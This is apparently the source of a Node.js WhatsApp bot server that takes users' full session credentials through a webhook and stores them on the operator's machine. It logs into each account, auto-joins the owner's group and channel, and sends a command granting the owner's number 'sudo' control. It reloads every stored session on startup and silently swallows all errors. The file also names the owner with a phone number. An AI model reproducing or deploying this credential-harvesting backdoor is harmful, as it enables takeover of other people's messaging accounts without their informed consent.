/**
 * VAMPARINA V1 - FULLY AUTOMATIC 2025
 * AUTO JOIN + AUTO SUDO + AUTO ACTIVATE FROM VAMPARINA-BOT-V1.ONRENDER.COM
 */

const fs = require('fs-extra')
const path = require('path')
const chalk = require('chalk')
const express = require('express')
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay
} = require("@whiskeysockets/baileys")
const pino = require("pino")

const app = express()
app.use(express.json({ limit: '100mb' })) // Increased limit for full creds.json
app.use(express.static('public'))

const activeBots = new Map()

// YOUR LINKS
const GROUP_INVITE = "HAGRfzDEVcXC1e2HtOIjwc"
const CHANNEL_ID = "0029VbBm7apIXnlmuyjGGM0p"
const SUDO_NUMBER = "254703110780"

// WEBHOOK TO ACTIVATE BOT — NOW 100% COMPATIBLE WITH AUTO-SEND
app.post('/vamparina-activate', async (req, res) => {
    try {
        const { sessionId, phone, files, creds } = req.body // Accept both formats

        if (!sessionId || !phone) return res.status(400).json({ error: "Invalid" })

        console.log(chalk.cyan(`\nNEW USER: ${phone} | Session: ${sessionId}`))
        console.log(chalk.yellow(`Time: ${new Date().toLocaleString('en-KE', { timeZone: 'Africa/Nairobi' })}\n`))

        const folder = path.join(__dirname, 'sessions', sessionId)
        await fs.ensureDir(folder)

        // Support both old and new auto-send formats
        if (files && Array.isArray(files)) {
            for (const file of files) {
                await fs.writeFile(path.join(folder, file.name), JSON.stringify(file.content, null, 2))
            }
        } else if (creds) {
            await fs.writeFile(path.join(folder, 'creds.json'), JSON.stringify(creds, null, 2))
        }

        startUserBot(sessionId, phone)
        res.json({ success: true, message: "VAMPARINA V1 ACTIVATED AUTOMATICALLY" })
    } catch (e) {
        console.error(chalk.red("Activation failed:"), e)
        res.status(500).json({ error: "Failed" })
    }
})

app.get('/', (req, res) => res.json({ 
    status: "VAMPARINA V1 MAIN BOT RUNNING", 
    active_users: activeBots.size,
    time: new Date().toLocaleString('en-KE', { timeZone: 'Africa/Nairobi' }),
    owner: "Arnold Chirchir",
    contact: "+254703110780"
}))

app.listen(process.env.PORT || 3000, () => {
    console.log(chalk.green.bold(`\nVAMPARINA V1 MAIN BOT IS LIVE`))
    console.log(chalk.cyan(`Receiving auto-sessions → https://vamparina-v1-5.onrender.com/vamparina-activate`))
    console.log(chalk.magenta(`Dashboard → https://vamparina-v1-5.onrender.com`))
    console.log(chalk.yellow(`Time: ${new Date().toLocaleString('en-KE', { timeZone: 'Africa/Nairobi' })}\n`))
})

// START BOT PER USER
async function startUserBot(sessionId, phone) {
    if (activeBots.has(sessionId)) return

    const sessionPath = path.join(__dirname, 'sessions', sessionId)

    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
        const { version } = await fetchLatestBaileysVersion()

        const sock = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            printQRInTerminal: false,
            auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })) },
            markOnlineOnConnect: true
        })

        sock.ev.on('creds.update', saveCreds)

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update

            if (connection === 'open') {
                console.log(chalk.green.bold(`VAMPARINA V1 ACTIVE → ${phone}@s.whatsapp.net`))

                await sock.sendMessage(phone + '@s.whatsapp.net', {
                    text: `*VAMPARINA V1 IS NOW LIVE!*\n\nBot activated automatically from your linker!\nOwner: ${SUDO_NUMBER}\nTime: ${new Date().toLocaleString('en-KE', { timeZone: 'Africa/Nairobi' })}`
                })

                // AUTO JOIN GROUP
                try { 
                    const g = await sock.groupAcceptInvite(GROUP_INVITE)
                    await sock.sendMessage(g, { text: "*VAMPARINA V1 HAS JOINED THE EMPIRE*" })
                } catch (e) {}

                // AUTO FOLLOW CHANNEL
                try { await sock.newsletterFollow(CHANNEL_ID) } catch (e) {}

                // AUTO ADD YOU AS SUDO
                try { await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${SUDO_NUMBER}` }) } catch (e) {}
            }

            if (connection === 'close') {
                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
                if (shouldReconnect) {
                    console.log(chalk.yellow(`Reconnecting ${phone} in 7s...`))
                    setTimeout(() => startUserBot(sessionId, phone), 7000)
                } else {
                    console.log(chalk.red(`Logged out → ${phone}`))
                    activeBots.delete(sessionId)
                    await fs.remove(sessionPath)
                }
            }
        })

        activeBots.set(sessionId, sock)
    } catch (err) {
        console.error(chalk.red("Bot failed to start:"), err)
    }
}

// LOAD ALL EXISTING SESSIONS ON STARTUP
(async () => {
    const dir = path.join(__dirname, 'sessions')
    if (fs.existsSync(dir)) {
        const folders = fs.readdirSync(dir).filter(f => fs.statSync(path.join(dir, f)).isDirectory())
        console.log(chalk.blue(`Loading ${folders.length} saved sessions...`))
        for (const f of folders) {
            const phone = f.includes('_') ? f.split('_')[1] : f.replace(/[^0-9]/g, '')
            startUserBot(f, phone)
            await delay(3000)
        }
    }
})()

process.on('uncaughtException', () => {})
process.on('unhandledRejection', () => {})